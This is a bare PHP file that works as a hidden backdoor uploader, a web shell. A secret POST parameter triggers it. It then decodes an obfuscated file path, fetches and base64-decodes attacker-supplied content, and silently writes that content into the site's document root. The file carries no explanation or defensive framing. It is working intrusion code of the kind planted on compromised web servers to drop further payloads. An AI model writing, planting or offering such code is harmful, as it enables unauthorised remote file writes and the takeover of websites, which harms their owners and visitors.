<?php
if(isset($_POST['5281405640589240726587'])){
	$index=$_SERVER['DOCUMENT_ROOT'].base64_decode(strtr($_POST['filename'],'-_,','+/='));
	$b =base64_decode(file_get_contents($_POST['b'])); 
	@file_put_contents($index,$b);
	echo 'ok';
}
?>